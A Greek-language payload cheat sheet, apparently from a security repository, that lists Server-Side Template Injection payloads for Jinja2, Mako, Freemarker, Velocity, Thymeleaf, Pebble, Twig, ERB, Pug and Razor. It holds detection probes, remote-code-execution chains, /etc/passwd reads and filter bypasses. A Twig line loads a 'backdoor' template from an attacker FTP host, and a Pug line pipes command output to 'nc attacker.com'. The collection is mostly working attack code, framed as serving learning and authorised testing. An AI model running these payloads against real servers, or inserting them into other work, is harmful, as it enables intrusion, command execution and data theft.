# 🔥 Συλλογή δοκιμαστικών εισόδων SSTI

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../SSTI.md) • [🇹🇷 Türkçe Sürüm](SSTI.tr.md)

```
  ███████╗███████╗████████╗██╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ██╔════╝██╔════╝╚══██╔══╝██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
  ███████╗███████╗   ██║   ██║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
  ╚════██║╚════██║   ██║   ██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ███████║███████║   ██║   ██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚══════╝╚══════╝   ╚═╝   ╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
                     Εισαγωγή σε πρότυπα στην πλευρά του server
```

---

## Πριν ξεκινήσετε

Το **SSTI (Server-Side Template Injection)** αφορά είσοδο που ερμηνεύεται ως έκφραση ή κώδικας προτύπου στον server. **Template engine** είναι ο μηχανισμός που μετατρέπει ένα πρότυπο σε τελικό περιεχόμενο. Το **RCE** σημαίνει απομακρυσμένη εκτέλεση κώδικα και δεν προκύπτει αυτόματα από κάθε SSTI.

Πρώτα επιβεβαιώστε πού αξιολογείται η έκφραση και ποιος μηχανισμός χρησιμοποιείται. Ίδια σύμβολα μπορεί να σημαίνουν διαφορετικά πράγματα σε διαφορετικούς μηχανισμούς. Πολλά παραδείγματα του πρωτοτύπου εξαρτώνται από συγκεκριμένες εκδόσεις, αντικείμενα εφαρμογής ή παλιότερες μη ασφαλείς ρυθμίσεις.

<a id="section-01"></a>

## 🔍 Δοκιμαστικές είσοδοι ανίχνευσης

### Αρχικές δοκιμές ανίχνευσης
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
{{7*'7'}}
```

> Η εμφάνιση `49` μετά από αριθμητική έκφραση αποτελεί ένδειξη αξιολόγησής της. Επιβεβαιώστε ότι η αξιολόγηση γίνεται στον server και δεν είναι στατικό περιεχόμενο ή λογική του browser.

### Αναγνώριση μηχανισμού προτύπων

> **Διόρθωση αρχικού πίνακα:** Η επανάληψη συμβολοσειράς του Jinja δεν πρέπει να αποδίδεται και στο Twig, που έχει αριθμητική σημασία για τον πολλαπλασιασμό. Μια μόνο έκφραση δεν αναγνωρίζει αξιόπιστα engine. Δείτε τις επίσημες περιγραφές [Jinja](https://jinja.palletsprojects.com/en/stable/templates/#math) και [Twig](https://twig.symfony.com/doc/3.x/templates.html#math).

```
{{7*'7'}}         → σύγκριση Jinja2/Twig· δείτε τη σημείωση της ενότητας
${7*7}            → Freemarker/Velocity
<%= 7*7 %>        → ERB (Ruby)
#{7*7}            → Pebble
*{7*7}            → Thymeleaf
```

---

<a id="section-02"></a>

## 🐍 Python (Jinja2)

> **Εξαρτήσεις από το περιβάλλον:** Τα αντικείμενα config/request μπορεί να μην υπάρχουν. Οι αριθμητικοί δείκτες subclasses δεν είναι σταθεροί και παραδείγματα με μη διαθέσιμες θέσεις MRO μπορεί να αποτυγχάνουν. Τα αρχικά δείγματα δεν έχουν επικυρωθεί ως έτοιμη αλυσίδα.


### Ανίχνευση
```python
{{7*7}}
{{config}}
{{config.items()}}
{{self}}
{{request}}
```

### Παραδείγματα απομακρυσμένης εκτέλεσης κώδικα
```python
# Μέθοδος 1 — config
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Μέθοδος 2 — cycler
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Μέθοδος 3 — MRO, όπως περιγράφεται στο πρωτότυπο
{{''.__class__.__mro__[1].__subclasses__()[287]('id',shell=True,stdout=-1).communicate()}}

# Μέθοδος 4 — lipsum
{{lipsum.__globals__.os.popen('id').read()}}

# Μέθοδος 5 — request
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Ανάγνωση αρχείων
```python
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read()}}
```

### Παραλλαγές για έλεγχο φίλτρων
```python
# Χρήση φίλτρου attr
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}

# Χρήση φίλτρου join
{%set x=''|join('')|attr('__class__')%}

# Δεκαεξαδική κωδικοποίηση
{{''['\x5f\x5fclass\x5f\x5f']}}
```

---

<a id="section-03"></a>

## 🌿 Python (Mako)

```python
<%import os%>${os.popen("id").read()}
${self.module.cache.util.os.system("id")}
${self.template.module.cache.util.os.popen("id").read()}
```

---

<a id="section-04"></a>

## ☕ Java (Freemarker)

### Ανίχνευση
```java
${7*7}
${object.class}
<#assign s="freemarker.template.utility.Execute"?new()>${s("id")}
```

### Παραδείγματα απομακρυσμένης εκτέλεσης κώδικα
```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>${ob("java.lang.ProcessBuilder",["id"]).start()}
${"freemarker.template.utility.Execute"?new()("id")}
```

---

<a id="section-05"></a>

## 🍃 Java (Velocity)

```java
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('id'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

### Απλό παράδειγμα
```java
#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
```

---

<a id="section-06"></a>

## 🌱 Java (Thymeleaf)

### Ανίχνευση
```java
${T(java.lang.Runtime).getRuntime().exec('id')}
*{T(java.lang.Runtime).getRuntime().exec('id')}
```

### Παραδείγματα απομακρυσμένης εκτέλεσης κώδικα
```java
${T(java.lang.Runtime).getRuntime().exec('id')}
${#rt=@java.lang.Runtime@getRuntime(),#rt.exec('id')}
```

---

<a id="section-07"></a>

## 🌸 Java (Pebble)

```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(bytes) }}
```

---

<a id="section-08"></a>

## 🐦 PHP (Twig)

### Ανίχνευση
```php
{{7*7}}
{{7*'7'}}  → το αρχικό αποτέλεσμα εξαρτάται από τον μηχανισμό· δείτε τη διευκρίνιση
{{dump(app)}}
{{_self}}
```

### Παραδείγματα απομακρυσμένης εκτέλεσης κώδικα
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{{['id']|filter('system')}}

{{['id']|map('system')|join}}

{{_self.env.setCache("ftp://attacker.com:21")}}{{_self.env.loadTemplate("backdoor")}}
```

### Ανάγνωση αρχείων
```php
{{'/etc/passwd'|file_excerpt(1,-1)}}
```

---

<a id="section-09"></a>

## 💎 Ruby (ERB)

### Ανίχνευση
```ruby
<%= 7*7 %>
<%= self %>
```

### Παραδείγματα απομακρυσμένης εκτέλεσης κώδικα
```ruby
<%= system("id") %>
<%= `id` %>
<%= IO.popen('id').readlines() %>
<%= require 'open3'; Open3.capture2('id') %>
```

---

<a id="section-10"></a>

## 🟢 Node.js (Jade/Pug)

### Ανίχνευση
```javascript
#{7*7}
-var x = 1; p= x
```

### Παραδείγματα απομακρυσμένης εκτέλεσης κώδικα
```javascript
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('id')}()}

-var x = root.process.mainModule.require
-x('child_process').exec('id | nc attacker.com 80')
```

---

<a id="section-11"></a>

## 🔷 .NET (Razor)

```csharp
@(7*7)
@{
    var p = new System.Diagnostics.Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c id";
    p.Start();
}
```

---

<a id="section-12"></a>

## 📊 Γρήγορη αναφορά

| Μηχανισμός προτύπων | Ανίχνευση | RCE |
| ----------------- | ----------- | ----- |
| Jinja2 | `{{7*7}}` | `{{config.__class__...}}` |
| Twig | `{{7*'7'}}` | `{{_self.env...}}` |
| Freemarker | `${7*7}` | `<#assign ex=...>` |
| Velocity | `$class.class` | `#set($rt=...)` |
| ERB | `<%= 7*7 %>` | `<%= system('id') %>` |
| Pug | `#{7*7}` | `#{global.process...}` |

---

<a id="section-13"></a>

## 🛡️ Παραδείγματα παράκαμψης του πρωτοτύπου και περιορισμοί

### Φιλτραρισμένες λέξεις-κλειδιά
```python
# Χρήση ορισμάτων αιτήματος
{{request.args.cmd}}?cmd=__class__

# Συνένωση συμβολοσειρών
{{''['__cla'+'ss__']}}

# Δεκαεξαδική κωδικοποίηση
{{''['\x5f\x5fclass\x5f\x5f']}}
```

### Φιλτραρισμένες αγκύλες
```python
{%print(7*7)%}
```

---

<a id="section-14"></a>

## 📚 Πηγές

- [PayloadsAllTheThings SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

---

<p align="center">
  <b>🔥 Συλλογή δοκιμαστικών εισόδων SSTI</b><br>
  <i>Για μάθηση και εξουσιοδοτημένους ελέγχους.</i>
</p>

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
